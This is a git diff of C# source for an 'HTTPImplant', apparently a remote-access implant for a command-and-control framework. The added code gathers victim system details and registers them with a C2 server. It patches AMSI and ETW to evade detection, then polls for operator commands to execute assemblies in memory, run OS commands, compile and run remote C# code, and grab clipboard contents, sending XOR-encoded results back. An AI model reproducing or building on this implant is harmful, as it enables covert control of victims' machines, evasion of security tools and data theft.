@@ -10,16 +10,45 @@ using System.Threading.Tasks;
 
 namespace HTTPImplant
 {
+    public class Command
+    {
+        public string Input { get; set; }
+        public string command { get; set; }  // Renamed to avoid conflict with class name
+        public string Args { get; set; }
+        public string ImplantUser { get; set; }
+        public string Operator { get; set; }
+        public string TimeToExec { get; set; }
+        public string Delay { get; set; }
+        public string File { get; set; }
+        public string NullTerm { get; set; }
+    }
+
+    public class Victim
+    {
+        public string ID { get; set; }  
+        public string DeviceName { get; set; }
+        public string Username { get; set; }
+        public int OperatorID { get; set; }
+        public string Network { get; set; }
+        public string OperatingSystem { get; set; }
+        public string CPU { get; set; }
+        public string GPU { get; set; }
+        public int RAM { get; set; }
+        public string Storage { get; set; }
+        public string CurrentDate { get; set; }
+    }
     // This Implant class acts as the entry point of the implant program.
     public class Implant
     {
-
+        public static Victim victim = new Victim();
         public string host { get; set; }  // Host of the implant server
         public string port { get; set; }  // Port of the implant server
         private static string lastCommandExecuted = string.Empty; // Store the last command that was executed
 
         public static void Main(string[] args)
         {
+            /*ClipboardFetcher.GetData();
+            Environment.Exit(0);*/
             DoAsync().GetAwaiter().GetResult();
         }
         public static async Task DoAsync()
@@ -27,15 +56,33 @@ namespace HTTPImplant
             string implantId = Environment.MachineName;
             string lastCommandExecuted = string.Empty;
 
-            MemEncrypt.ReadMem();
+            string victim_information = GenerateJson();
+
+            // Console.WriteLine(victim_information);
+            Console.WriteLine("Registering Implant...");
+
+            await RegisterImplant(victim_information);
+            var victim = new Victim();
+
+            victim = GetVictim(victim);
+            /*
+            Console.WriteLine("ID: " + victim.ID);
+            Console.WriteLine("DeviceName: " + victim.DeviceName);
+            Console.WriteLine("Username: " + victim.Username);
+            Console.WriteLine("OperatorID: " + victim.OperatorID);
+            Console.WriteLine("CPUArchitecture: " + victim.CPU);
+            Console.WriteLine("GPUInfo: " + victim.GPU);
+            Console.WriteLine("RAMInfo: " + victim.RAM);
+            Console.WriteLine("OSName: " + victim.OperatingSystem);
+            Console.WriteLine("NetworkInfo: " + victim.Network);
+            Console.WriteLine("CurrentDate: " + victim.CurrentDate);
+            */
 
             AmsiHBP.Start();
 
             EtwPatch.Start();
 
-            Environment.Exit(0);
-
-            TestStomper("localhost", "8000", "calc64.bin");
+            //TestStomper("localhost", "8000", "calc64.bin");
 
             using (WebClient webClient = new WebClient())
             {
@@ -58,56 +105,76 @@ namespace HTTPImplant
                         command.File = jsonResponse.Split(new string[] { "\"File\":\"", "\",\"nullterm" }, StringSplitOptions.None)[1];
                         command.NullTerm = jsonResponse.Split(new string[] { "\"nullterm\":\"", "\"}" }, StringSplitOptions.None)[1];
 
+                        /*Console.WriteLine("User for issued command: " + command.ImplantUser);
+                        Console.WriteLine("Current implant user: " + victim.Username);*/
 
-                        // Check if lastCommandExecuted is empty
-                        if (string.IsNullOrEmpty(lastCommandExecuted))
+                        if (command.ImplantUser == victim.Username)
                         {
-                            lastCommandExecuted = command.Input;
-                            continue; // Restart the loop
-                        }
-
-                        await Task.Delay(5000);
-
-                        // Update lastCommandExecuted
-                        lastCommandExecuted = command.Input;
-
-                        if (command.Input.Trim().Equals("execute-assembly", StringComparison.OrdinalIgnoreCase))
-                        {
-                            Console.WriteLine("Running assembly");
-                            byte[] bytes = Convert.FromBase64String(command.File);
-                            string output = ExecuteAssembly.Execute(bytes);
-                            string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                            Console.WriteLine(output);
-                            await SendResult(webClient, implantId, command.Operator, outputBase64);
-                        }
-                        else if (command.Input.Trim().Equals("os", StringComparison.OrdinalIgnoreCase))
-                        {
-                            Console.WriteLine("Running command: " + command.command);
-                            string output = Commands.command(command.command, command.Args);
-                            string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
-                            await SendResult(webClient, implantId, command.Operator, outputBase64);
-                        }
-                        else if (command.Input.Trim().ToLower().Equals("loadcs"))
-                        {
-                            try
+                            do
                             {
-                                string[] parts = command.File.Split(new[] { "  " }, StringSplitOptions.None);
-                                string encodedSourceCode = parts[0];
-                                string className = parts[1];
-                                string methodName = parts[2];
+                                // Check if lastCommandExecuted is empty
+                                if (string.IsNullOrEmpty(lastCommandExecuted))
+                                {
+                                    lastCommandExecuted = command.Input;
+                                    continue; // Restart the loop
+                                }
 
-                                byte[] data = Convert.FromBase64String(encodedSourceCode);
-                                string decodedSourceCode = Encoding.UTF8.GetString(data);
+                                await Task.Delay(5000);
 
-                                Console.WriteLine("\r\n\r\nExecuting: " + className + "." + methodName + " For:");
-                                Console.WriteLine("\r\n\r\n" + decodedSourceCode + "\r\n\r\n");
+                                // Update lastCommandExecuted
+                                lastCommandExecuted = command.Input;
 
-                                CompileAndRunNET.ExecuteCS(decodedSourceCode, className, methodName);
-                            }
-                            catch (Exception ex)
-                            {
-                                Console.WriteLine("Exception caught: " + ex.ToString());
-                            }
+                                if (command.Input.Trim().Equals("execute-assembly", StringComparison.OrdinalIgnoreCase))
+                                {
+                                    Console.WriteLine("Running assembly");
+                                    byte[] bytes = Convert.FromBase64String(command.File);
+                                    string output = ExecuteAssembly.Execute(bytes);
+                                    string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
+                                    Console.WriteLine(output);
+                                    await SendResult(webClient, implantId, command.Operator, outputBase64);
+                                }
+                                else if (command.Input.Trim().Equals("os", StringComparison.OrdinalIgnoreCase))
+                                {
+                                    Console.WriteLine("Running command: " + command.command);
+                                    string output = Commands.command(command.command, command.Args);
+                                    string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
+                                    await SendResult(webClient, implantId, command.Operator, outputBase64);
+                                }
+                                else if (command.Input.Trim().Equals("clip", StringComparison.OrdinalIgnoreCase))
+                                {
+                                    Console.WriteLine("Running clipboard fetcher... ");
+                                    string output = ClipboardFetcher.GetData();
+                                    string outputBase64 = Convert.ToBase64String(Encoding.UTF8.GetBytes(output));
+                                    await SendResult(webClient, implantId, command.Operator, outputBase64);
+                                }
+                                else if (command.Input.Trim().ToLower().Equals("loadcs"))
+                                {
+                                    try
+                                    {
+                                        string[] parts = command.File.Split(new[] { "  " }, StringSplitOptions.None);
+                                        string encodedSourceCode = parts[0];
+                                        string className = parts[1];
+                                        string methodName = parts[2];
+
+                                        byte[] data = Convert.FromBase64String(encodedSourceCode);
+                                        string decodedSourceCode = Encoding.UTF8.GetString(data);
+
+                                        Console.WriteLine("\r\n\r\nExecuting: " + className + "." + methodName + " For:");
+                                        Console.WriteLine("\r\n\r\n" + decodedSourceCode + "\r\n\r\n");
+
+                                        CompileAndRunNET.ExecuteCS(decodedSourceCode, className, methodName);
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        Console.WriteLine("Exception caught: " + ex.ToString());
+                                    }
+                                }
+                            } while (command.Input != lastCommandExecuted);
+                        }
+                        else
+                        {
+                            Console.WriteLine("No new commands...");
+                            await Task.Delay(5000);
                         }
                     }
                     catch (Exception e)
@@ -118,17 +185,6 @@ namespace HTTPImplant
             }
         }
 
-        public static void TestStomper(string hostname, string port, string file)
-        {
-            try
-            {
-                Console.WriteLine("Running stomper");
-                _ = Modules.ModuleStomper.Execute(hostname, port, file);
-                Console.WriteLine("Done.");
-                Environment.Exit(1);
-            } 
-            catch (Exception e) { Console.WriteLine($"Error {e}"); }
-        }
         public static async Task SendResult(WebClient webClient, string implantId, string operatorId, string outputBase64)
         {
             string XORKeyB64 = "NVm5dzr1hyhOm4jBTNSFhQGrFhR1gvhbn/BbvZowkO0=";
@@ -151,19 +207,81 @@ namespace HTTPImplant
             return result;
         }
 
-    }
+        public static string GenerateJson()
+        {
+            string id = GetImplantInfo.GenerateRandomString(6); // Assuming this is a random string
+            string deviceName = GetImplantInfo.GetComputerName();
+            string username = GetImplantInfo.Username();
+            string operatingSystem = GetImplantInfo.OperatingSystem();
+            int ram = GetImplantInfo.RAM(); // Assuming RAM() returns something like "16 GB"
+            string cpu = GetImplantInfo.CPU();
+            string gpu = GetImplantInfo.GPU();
+            string storage = GetImplantInfo.Storage();
+            string network = GetImplantInfo.Network().Replace("\n", "\\n").Replace("\r", "\\r").Replace("\"", "\\\"");
+            string currentDate = GetImplantInfo.GetCurrentDate();
+            int operatorId = 1;
 
-    // The Command class represents a command that is sent from the server.
-    public class Command
-    {
-        public string Input { get; set; }
-        public string command { get; set; }  // Renamed to avoid conflict with class name
-        public string Args { get; set; }
-        public string ImplantUser { get; set; }
-        public string Operator { get; set; }
-        public string TimeToExec { get; set; }
-        public string Delay { get; set; }
-        public string File { get; set; }
-        public string NullTerm { get; set; }
+            string json = "{\n" +
+                "\t\"ID\": \"" + id + "\",\n" +
+                "\t\"DeviceName\": \"" + deviceName + "\",\n" +
+                "\t\"Username\": \"" + username + "\",\n" +
+                "\t\"OperatorID\": " + operatorId + ",\n" +
+                "\t\"CPUArchitecture\": \"" + cpu + "\",\n" +
+                "\t\"GPUInfo\": \"" + gpu + "\",\n" +
+                "\t\"RAMInfo\": " + ram + ",\n" +
+                "\t\"OSName\": \"" + operatingSystem + "\",\n" +
+                "\t\"NetworkInfo\": \"" + network + "\",\n" +
+                "\t\"CurrentDate\": \"" + currentDate + "\"\n" +
+            "}";
+
+            return json;
+        }
+
+        public static Victim GetVictim(Victim victim)
+        {
+            string id = GetImplantInfo.GenerateRandomString(6); // Assuming this is a random string
+            string deviceName = GetImplantInfo.GetComputerName();
+            string username = GetImplantInfo.Username();
+            string operatingSystem = GetImplantInfo.OperatingSystem();
+            int ram = GetImplantInfo.RAM(); // Assuming RAM() returns something like "16 GB"
+            string cpu = GetImplantInfo.CPU();
+            string gpu = GetImplantInfo.GPU();
+            string storage = GetImplantInfo.Storage();
+            string network = GetImplantInfo.Network().Replace("\n", "\\n").Replace("\r", "\\r").Replace("\"", "\\\"");
+            string currentDate = GetImplantInfo.GetCurrentDate();
+            int operatorId = 1;
+
+            victim.ID = id;
+            victim.Username = username;
+            victim.DeviceName = deviceName;
+            victim.OperatingSystem = operatingSystem;
+            victim.CPU = cpu;
+            victim.GPU = gpu;
+            victim.Storage = storage;
+            victim.Network = network;
+            victim.CurrentDate = currentDate;
+            victim.RAM = ram;
+            victim.OperatorID = operatorId;
+
+            return victim;
+        }
+
+
+        public static async Task RegisterImplant(string victim_json)
+        {
+            using (var webClient = new WebClient())
+            {
+                webClient.Headers[HttpRequestHeader.ContentType] = "application/json";
+                try
+                {
+                    await webClient.UploadStringTaskAsync(new Uri("http://127.0.0.1:8081/registerNewImplant"), "POST", victim_json);
+                }
+                catch (WebException ex)
+                {
+                    // Handle the exception according to your needs
+                    Console.WriteLine("Error: " + ex.Message);
+                }
+            }
+        }
     }
 }
